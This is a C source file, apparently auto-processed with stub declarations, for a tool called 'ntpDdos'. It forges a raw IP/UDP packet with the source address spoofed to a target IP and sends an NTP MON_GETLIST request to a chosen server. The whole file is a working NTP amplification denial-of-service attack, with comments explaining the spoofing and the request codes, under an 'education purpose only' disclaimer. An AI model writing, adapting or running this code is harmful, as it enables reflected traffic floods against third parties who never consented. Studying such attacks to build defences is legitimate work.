#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct udpheader {scalar_t__ udp_checksum; void* udp_length; void* udp_destinationPortNumber; void* udp_sourcePortNumber; } ;
struct TYPE_2__ {void* s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; void* sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct ntpreqheader {int rm_vn_mode; int implementation; int request; } ;
struct iphdr {int version; int ihl; int tot_len; int ttl; scalar_t__ check; void* daddr; void* saddr; int /*<<< orphan*/  protocol; scalar_t__ frag_off; void* id; scalar_t__ tos; } ;
typedef  int /*<<< orphan*/  packet ;
typedef  int /*<<< orphan*/  dest ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  IPPROTO_IP ; 
 int /*<<< orphan*/  IPPROTO_UDP ; 
 int /*<<< orphan*/  IP_HDRINCL ; 
 int /*<<< orphan*/  PF_INET ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int atoi (char*) ; 
 scalar_t__ csum (unsigned short*,int) ; 
 int /*<<< orphan*/  exit (int) ; 
 void* htons (int) ; 
 void* inet_addr (char*) ; 
 int /*<<< orphan*/  memset (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  printf (char*) ; 
 int sendto (int,char*,int,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
 int setsockopt (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 

int main(int argc, char **argv)
{
int status;			// Maintains the return values of the functions
struct iphdr *ip;		// Pointer to ip header struct
struct udpheader *udp;		// Pointer to udp header struct
struct ntpreqheader *ntp;	// Pointer to ntp request header struct
int sockfd;			// Maintains the socket file descriptor
int one = 1;			// Sets the option IP_HDRINCL of the sockt to tell the kernel that the header are alredy included on the packets.
struct sockaddr_in dest;	// Maintains the data of the destination address
char packet[ sizeof(struct iphdr) + sizeof(struct udpheader) + sizeof(struct ntpreqheader) ]; //Packet itself

// Parameters check
	if( argc != 3){
		printf("Usage: ./ntpDdos [Target IP] [NTP Server IP]\n");
		printf("Example: ./ntpDdos 1.2.3.4 127.0.0.1 \n");
		printf("Watch it on wireshark!\n");
		printf("Coded for education purpose only!\n");
		exit(1);
	}

// Create a socket and tells the kernel that we want to use udp as layer 4 protocol
	sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	if (sockfd == -1){
		printf("Error on initializing the socket\n");
		exit(1);
	}



//Sets the option IP_HDRINCL
	status = setsockopt( sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof one);
	if (status == -1){
                printf("Error on setting the option HDRINCL on socket\n");
                exit(1);
        }


//"Zeroes" all the packet stack
	memset( packet, 0, sizeof(packet) );


//Mounts the packet headers
// [ [IP HEADER] [UDP HEADER] [NTP HEADER] ] --> Victory!!!
	ip = (struct iphdr *)packet;
	udp = (struct udpheader *) (packet + sizeof(struct iphdr) );
	ntp = (struct ntpreqheader *) (packet + sizeof(struct iphdr) + sizeof(struct udpheader) );


//Fill the IP Header
	ip->version = 4;		//IPv4
        ip->ihl = 5;			//Size of the Ip header, minimum 5
        ip->tos = 0;			//Type of service, the default value is 0
        ip->tot_len = sizeof(packet);   //Size of the datagram
        ip->id = htons(1234);   	//LengthIdentification Number
        ip->frag_off = 0;		//Flags, zero represents reserved
        ip->ttl = 255;	      		//Time to Live. Maximum of 255
        ip->protocol = IPPROTO_UDP;	//Sets the UDP as the next layer protocol
        ip->check = 0;	      		//Checksum.
        ip->saddr = inet_addr( argv[1] );  //Source ip ( spoofing goes here)
        ip->daddr = inet_addr( argv[2] ); //Destination IP

	//Fills the UDP Header
	udp->udp_sourcePortNumber = htons( atoi( "123" ) );       //Source Port
	udp->udp_destinationPortNumber = htons(atoi("123")) ;   //Destination Port
	udp->udp_length = htons( sizeof(struct udpheader) + sizeof(struct ntpreqheader) ); //Length of the packet
	udp->udp_checksum = 0;				     //Checksum

	//Calculate the checksums
	ip->check = csum((unsigned short *)packet, ip->tot_len);   //Calculate the checksum for iP header

	//Sets the destination data
	dest.sin_family = AF_INET;				 // Address Family Ipv4
	dest.sin_port = htons (atoi( "123" ) ) ; 		// Destination port
	dest.sin_addr.s_addr = inet_addr( argv[2] );       // Destination EndereÃ§o para onde se quer enviar o pacote 

	//Fills the NTP header
	//Ok, here is the magic, we need to send a request ntp packet with the modes and codes sets for only MON_GETLIST
	//To do this we can import the ntp_types.h and use its structures and macros. To simplify i've created a simple version of the 
	// ntp request packet and hardcoded the values for the fields to make a "MON_GETLIST" request packet. 
	// To learn more, read this: http://searchcode.com/codesearch/view/451164#127
	ntp->rm_vn_mode=0x17;       //Sets the response bit to 0, More bit to 0, Version field to 2, Mode field to 7
	ntp->implementation=0x03;   //Sets the implementation to 3
	ntp->request=0x2a;	    //Sets the request field to 42 ( MON_GETLIST )
				    //All the other fields of the struct are zeroed
	

	// Sends the packets
	status = sendto(sockfd, packet, ip->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest) );
		if(status <0){
			printf("Failed to send the packets\n");
			exit(1);
		}


}